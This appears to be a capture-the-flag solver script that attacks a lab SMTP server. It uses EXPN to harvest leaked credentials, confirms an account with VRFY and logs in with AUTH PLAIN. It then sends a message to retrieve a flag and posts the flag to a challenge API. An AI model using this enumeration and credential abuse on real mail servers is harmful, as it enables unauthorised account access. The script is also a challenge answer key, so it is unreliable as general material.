#!/bin/sh
set -eu
python3 - <<'PY'
import base64
import json
import re
import socket
import subprocess

HOST = "172.20.0.141"
PORT = 25

def read_reply(f):
    lines = []
    while True:
        line = f.readline().decode("utf-8", "replace").rstrip("\r\n")
        if not line:
            raise RuntimeError("connection closed")
        lines.append(line)
        if len(line) >= 4 and line[3] == " ":
            return lines

def send(f, command):
    f.write((command + "\r\n").encode())
    f.flush()
    return read_reply(f)

with socket.create_connection((HOST, PORT), timeout=5) as sock:
    f = sock.makefile("rwb", buffering=0)
    read_reply(f)
    send(f, "EHLO solver")
    roster_reply = send(f, "EXPN crew")
    candidates = []
    for line in roster_reply:
        match = re.search(r"250[- ]([a-z]+):([^\s]+)$", line)
        if match:
            candidates.append((match.group(1), match.group(2)))
    selected = None
    for username, password in candidates:
        response = send(f, "VRFY " + username)
        if response[-1].startswith("250 "):
            selected = (username, password)
            break
    if selected is None:
        raise RuntimeError("no verified account found")

    username, password = selected
    token = base64.b64encode(("\x00" + username + "\x00" + password).encode()).decode()
    auth_reply = send(f, "AUTH PLAIN " + token)
    if not auth_reply[-1].startswith("235 "):
        raise RuntimeError("authentication failed")
    send(f, "MAIL FROM:<solver@lab.invalid>")
    send(f, "RCPT TO:<archive@lab.invalid>")
    send(f, "DATA")
    f.write(b"Subject: archive request\r\n\r\nPlease return the final broadcast.\r\n.\r\n")
    f.flush()
    result = "\n".join(read_reply(f))
    flag_match = re.search(r"BSY\{[^}]+\}", result)
    if not flag_match:
        raise RuntimeError("archive response did not contain a flag")
    flag = flag_match.group(0)
    send(f, "QUIT")

payload = json.dumps({"challenge_id": "scl-challenge-frame-b8c0e2", "task_id": "task1", "flag": flag})
subprocess.run([
    "curl", "-s", "http://172.20.0.3/api/challenges/submit", "-X", "POST",
    "-H", "Content-Type: application/json", "--data-binary", payload
], check=True)
PY
